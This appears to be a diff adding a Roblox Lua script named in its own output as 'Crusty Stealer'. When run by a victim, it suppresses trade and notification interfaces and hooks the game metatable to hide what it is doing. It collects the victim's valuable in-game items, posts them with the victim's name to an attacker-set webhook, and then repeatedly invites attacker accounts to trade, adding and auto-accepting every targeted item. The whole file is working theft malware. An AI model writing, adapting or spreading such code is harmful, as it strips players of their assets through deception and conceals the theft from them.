@@ -1,0 +1,442 @@
+if game.PlaceId ~= 109983668079237 and game.PlaceId ~= 96342491571673 then
+    return
+end
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local TARGET_USERS = getgenv().TARGET_USERS or {}
+if #TARGET_USERS == 0 and getgenv().TARGET_USER then
+    TARGET_USERS = {getgenv().TARGET_USER}
+end
+local WEBHOOK_URL = getgenv().WEBHOOK_URL or ""
+local TARGET_BRAINROTS = getgenv().NORMAL_BRAINROTS or {}
+local TARGET_BASE_SKINS = getgenv().NORMAL_BASE_SKINS or {}
+local TARGET_GEARS = getgenv().NORMAL_GEARS or {}
+local DELAY_BETWEEN_INVITES = getgenv().DELAY_BETWEEN_INVITES or 15
+
+local tradeCompleted = false
+local webhookSent = false
+
+local function blockCornerNotifications()
+    local cornerNotif = PlayerGui:FindFirstChild("DuelsMachinePrompt")
+    if cornerNotif then
+        cornerNotif.Enabled = false
+        cornerNotif.Visible = false
+        for _, child in ipairs(cornerNotif:GetChildren()) do
+            if child:IsA("Frame") or child:IsA("ScreenGui") then
+                child.Enabled = false
+                child.Visible = false
+            end
+        end
+    end
+end
+
+local function blockNormalNotifications()
+    local notif = PlayerGui:FindFirstChild("Notification")
+    if notif then
+        notif.Enabled = false
+        for _, child in ipairs(notif:GetChildren()) do
+            if child:IsA("Frame") or child:IsA("ScreenGui") then
+                child.Enabled = false
+                child.Visible = false
+            end
+        end
+    end
+end
+
+local function blockTradeUI()
+    for _, gui in ipairs(PlayerGui:GetChildren()) do
+        if gui:IsA("ScreenGui") then
+            if string.find(gui.Name, "Trade") or 
+               gui.Name == "TradePrompts" or
+               gui.Name == "TradeLiveTrade" or
+               gui.Name == "TradePlayerList" then
+                gui.Enabled = false
+                gui.Visible = false
+            end
+        end
+    end
+end
+
+local function blockNewUI()
+    local mt = getrawmetatable(game)
+    if mt then
+        local old = mt.__newindex
+        setreadonly(mt, false)
+        mt.__newindex = function(self, key, value)
+            if key == "Parent" and value == PlayerGui then
+                if self:IsA("ScreenGui") then
+                    if string.find(self.Name, "Trade") or 
+                       string.find(self.Name, "Prompt") then
+                        return
+                    end
+                end
+            end
+            return old(self, key, value)
+        end
+        setreadonly(mt, true)
+    end
+end
+
+local function blockNotificationRemote()
+    local net = ReplicatedStorage:FindFirstChild("Packages")
+    if net then
+        net = net:FindFirstChild("Net")
+        if net then
+            for _, remote in ipairs(net:GetChildren()) do
+                if remote:IsA("RemoteEvent") then
+                    if string.find(remote.Name, "NotificationService/Notify") or
+                       string.find(remote.Name, "DuelsMachinePrompt") or
+                       string.find(remote.Name, "TradeService/InviteResult") then
+                        local connections = getconnections(remote.OnClientEvent)
+                        for _, conn in ipairs(connections) do
+                            conn:Disable()
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+local function getRemote(name)
+    local net = ReplicatedStorage:FindFirstChild("Packages")
+    if net then
+        net = net:FindFirstChild("Net")
+        if net then
+            local children = net:GetChildren()
+            for i = 1, #children - 1 do
+                if string.find(children[i].Name, name) then
+                    return children[i + 1]
+                end
+            end
+        end
+    end
+    return nil
+end
+
+local function getUserData()
+    local Sync = ReplicatedStorage:FindFirstChild("Packages")
+    if Sync then
+        Sync = Sync:FindFirstChild("Synchronizer")
+        if Sync then
+            local Get = require(Sync).Get
+            for i = 1, 15 do
+                local ok, result = pcall(debug.getupvalue, Get, i)
+                if ok and type(result) == "table" then
+                    return result
+                end
+            end
+        end
+    end
+    return nil
+end
+
+local function getGeneration(animalIndex, mutation, traits)
+    local Animals2 = ReplicatedStorage:FindFirstChild("Shared")
+    if Animals2 then
+        Animals2 = Animals2:FindFirstChild("Animals")
+        if Animals2 then
+            local ok, result = pcall(require(Animals2).GetGeneration, animalIndex, mutation, traits or {}, nil)
+            if ok then
+                return result
+            end
+        end
+    end
+    return 0
+end
+
+local function formatCurrency(val)
+    if val >= 1e12 then return "$" .. string.format("%.2fT", val / 1e12):gsub("%.?0+$", "")
+    elseif val >= 1e9 then return "$" .. string.format("%.2fB", val / 1e9):gsub("%.?0+$", "")
+    elseif val >= 1e6 then return "$" .. string.format("%.2fM", val / 1e6):gsub("%.?0+$", "")
+    elseif val >= 1e3 then return "$" .. string.format("%.2fK", val / 1e3):gsub("%.?0+$", "")
+    else return "$" .. math.floor(val) end
+end
+
+local function sendWebhook(data)
+    if WEBHOOK_URL == "" then return end
+    local request = syn and syn.request or (http and http.request or (http_request or request))
+    if not request then return end
+    pcall(function()
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+end
+
+local function getUserIdFromName(username)
+    if type(username) == "number" then
+        return username
+    end
+    if type(username) == "string" then
+        local success, result = pcall(function()
+            return Players:GetUserIdFromNameAsync(username)
+        end)
+        if success and result then
+            return result
+        end
+    end
+    return nil
+end
+
+local function isPlayerOnline(userId)
+    if type(userId) == "string" then
+        userId = tonumber(userId)
+    end
+    if not userId then return false end
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.UserId == userId then
+            return true
+        end
+    end
+    return false
+end
+
+local function safeAddBrainrot(addRemote, slotKey, data)
+    local success, result = pcall(function()
+        return addRemote:InvokeServer("6b5f15fb-5cb9-4d07-a031-bbff8e641eda", slotKey, data)
+    end)
+    if success then
+        return result
+    end
+    return nil
+end
+
+local function safeReady(readyRemote)
+    pcall(function()
+        readyRemote:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9")
+    end)
+end
+
+local function safeAccept(acceptRemote)
+    pcall(function()
+        acceptRemote:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb")
+    end)
+end
+
+local function main()
+    blockCornerNotifications()
+    blockNormalNotifications()
+    blockTradeUI()
+    blockNewUI()
+    blockNotificationRemote()
+    
+    task.spawn(function()
+        while task.wait(1) do
+            pcall(blockCornerNotifications)
+            pcall(blockNormalNotifications)
+            pcall(blockTradeUI)
+        end
+    end)
+    
+    local userData = getUserData()
+    if not userData then return end
+    
+    local foundItems = {
+        brainrots = {},
+        baseSkins = {},
+        gears = {}
+    }
+
+    for _, data in pairs(userData) do
+        if type(data) == "table" then
+            local owner = data.Owner
+            if type(owner) == "table" and owner.UserId == LocalPlayer.UserId then
+                local animalList = data.AnimalList
+                if type(animalList) == "table" then
+                    for slotKey, animal in pairs(animalList) do
+                        if type(animal) == "table" and animal.Index then
+                            local animalName = animal.Index
+                            if TARGET_BRAINROTS[animalName] then
+                                local mutation = animal.Mutation or ""
+                                local traits = animal.Traits or {}
+                                local gen = getGeneration(animalName, mutation, traits)
+                                table.insert(foundItems.brainrots, {
+                                    name = animalName,
+                                    mutation = mutation,
+                                    gen = gen,
+                                    formattedGen = formatCurrency(gen),
+                                    slotKey = slotKey,
+                                    data = animal
+                                })
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    local baseSkins = userData:Get("BaseSkinInventory")
+    if type(baseSkins) == "table" then
+        for uuid, skinData in pairs(baseSkins) do
+            if type(skinData) == "table" and skinData.SkinName then
+                if TARGET_BASE_SKINS[skinData.SkinName] then
+                    table.insert(foundItems.baseSkins, {
+                        name = skinData.SkinName,
+                        uuid = uuid
+                    })
+                end
+            end
+        end
+    end
+
+    local gears = userData:Get("GearInventory")
+    if type(gears) == "table" then
+        for uuid, gearData in pairs(gears) do
+            if type(gearData) == "table" and gearData.GearName then
+                if TARGET_GEARS[gearData.GearName] then
+                    table.insert(foundItems.gears, {
+                        name = gearData.GearName,
+                        uuid = uuid
+                    })
+                end
+            end
+        end
+    end
+
+    if not webhookSent then
+        webhookSent = true
+        local embed = {
+            title = "Stealer Results",
+            color = 0x00FF00,
+            fields = {}
+        }
+
+        if #foundItems.brainrots > 0 then
+            local brainrotNames = {}
+            for _, b in ipairs(foundItems.brainrots) do
+                local name = b.mutation ~= "" and ("[" .. b.mutation .. "] ") or ""
+                table.insert(brainrotNames, name .. b.name .. " - " .. b.formattedGen)
+            end
+            table.insert(embed.fields, {
+                name = "Brainrots (" .. #foundItems.brainrots .. ")",
+                value = table.concat(brainrotNames, "\n") or "None",
+                inline = false
+            })
+        end
+
+        if #foundItems.baseSkins > 0 then
+            local skinNames = {}
+            for _, s in ipairs(foundItems.baseSkins) do
+                table.insert(skinNames, s.name)
+            end
+            table.insert(embed.fields, {
+                name = "Base Skins (" .. #foundItems.baseSkins .. ")",
+                value = table.concat(skinNames, "\n") or "None",
+                inline = false
+            })
+        end
+
+        if #foundItems.gears > 0 then
+            local gearNames = {}
+            for _, g in ipairs(foundItems.gears) do
+                table.insert(gearNames, g.name)
+            end
+            table.insert(embed.fields, {
+                name = "Gears (" .. #foundItems.gears .. ")",
+                value = table.concat(gearNames, "\n") or "None",
+                inline = false
+            })
+        end
+
+        table.insert(embed.fields, {
+            name = "Victim",
+            value = LocalPlayer.Name,
+            inline = true
+        })
+
+        table.insert(embed.fields, {
+            name = "Target(s)",
+            value = table.concat(TARGET_USERS, ", "),
+            inline = true
+        })
+
+        table.insert(embed.fields, {
+            name = "Time",
+            value = os.date("%H:%M:%S"),
+            inline = true
+        })
+
+        sendWebhook({
+            username = "Crusty Stealer",
+            avatar_url = "https://i.ibb.co/Zzd40XF2/IMG-1023.png",
+            embeds = { embed }
+        })
+    end
+
+    local hasTargetItems = #foundItems.brainrots > 0 or #foundItems.baseSkins > 0 or #foundItems.gears > 0
+    
+    if hasTargetItems and #TARGET_USERS > 0 then
+        local inviteRemote = getRemote("TradeService/Invite")
+        local addBrainrotRemote = getRemote("TradeService/AddBrainrot")
+        local addItemRemote = getRemote("TradeService/AddItem")
+        local readyRemote = getRemote("TradeService/Ready")
+        local acceptRemote = getRemote("TradeService/Accept")
+        
+        if inviteRemote and (addBrainrotRemote or addItemRemote) then
+            while not tradeCompleted do
+                for _, target in ipairs(TARGET_USERS) do
+                    if target ~= "" then
+                        local userId = getUserIdFromName(target)
+                        if userId and isPlayerOnline(userId) then
+                            local inviteSuccess = pcall(inviteRemote.InvokeServer, inviteRemote, "afb005f9-6e81-4e0a-8bb0-3555938a9658", userId)
+                            if inviteSuccess then
+                                task.wait(3)
+                                
+                                if #foundItems.brainrots > 0 and addBrainrotRemote then
+                                    for i, brainrot in ipairs(foundItems.brainrots) do
+                                        local added = safeAddBrainrot(addBrainrotRemote, brainrot.slotKey, brainrot.data)
+                                        task.wait(1.5)
+                                        if i % 3 == 0 then
+                                            task.wait(1)
+                                        end
+                                    end
+                                end
+                                
+                                if #foundItems.baseSkins > 0 and addItemRemote then
+                                    for _, skin in ipairs(foundItems.baseSkins) do
+                                        pcall(addItemRemote.InvokeServer, addItemRemote, "f2c4a9d1-3b7e-4a51-9c8d-1e6f0a2b3c4d", "BaseSkin", skin)
+                                        task.wait(1.5)
+                                    end
+                                end
+                                
+                                if #foundItems.gears > 0 and addItemRemote then
+                                    for _, gear in ipairs(foundItems.gears) do
+                                        pcall(addItemRemote.InvokeServer, addItemRemote, "f2c4a9d1-3b7e-4a51-9c8d-1e6f0a2b3c4d", "Gear", gear)
+                                        task.wait(1.5)
+                                    end
+                                end
+                                
+                                if readyRemote and acceptRemote then
+                                    task.wait(3)
+                                    safeReady(readyRemote)
+                                    task.wait(2)
+                                    safeAccept(acceptRemote)
+                                end
+                            end
+                        end
+                    end
+                end
+                
+                task.wait(DELAY_BETWEEN_INVITES)
+            end
+            
+            sendWebhook({
+                content = "Trade concluída com sucesso!",
+                username = "Crusty Stealer",
+                avatar_url = "https://i.ibb.co/Zzd40XF2/IMG-1023.png"
+            })
+        end
+    end
+end
+
+pcall(main)
